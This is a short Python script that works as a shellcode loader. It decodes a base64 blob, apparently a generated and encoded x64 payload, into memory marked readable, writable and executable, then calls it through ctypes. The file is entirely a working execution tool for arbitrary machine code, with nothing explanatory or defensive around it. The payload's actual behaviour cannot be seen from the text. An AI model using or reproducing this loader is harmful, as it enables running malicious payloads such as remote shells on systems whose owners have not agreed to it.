#!/usr/bin/python3

import base64
import mmap
import ctypes

# Base64-encoded shellcode (the one you generated)
encoded_shellcode = "SDHJSIHp9////0iNBe////9Iu6ajGtSlB5bkSDFYJ0gt+P///+L07hs1tsxpuZfOo4OE8VjEgs6OeYD7VX75pqMa+81o+4GJ03LnlnW5rfXrX5jpKuDUiJE1vdZv8uTw9E6KzzzO66OjGtSlB5bk"

# Function to decode and execute the shellcode
def execute_shellcode(encoded_shellcode):
    # Ensure padding (if needed)
    encoded_shellcode = encoded_shellcode.strip()

    # Decode the shellcode from base64
    shellcode = base64.b64decode(encoded_shellcode)

    # Create RWX memory using mmap
    shellcode_size = len(shellcode)
    mem = mmap.mmap(-1, shellcode_size, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)

    # Write the shellcode into the mmap'd memory
    mem.write(shellcode)

    # Get the address of the mmap'd memory and cast to a function pointer
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
    shell_func = ctypes.CFUNCTYPE(None)(addr)

    print("Executing shellcode...")
    # Execute the shellcode
    shell_func()

# Execute the shellcode after decoding the Base64 string
execute_shellcode(encoded_shellcode)
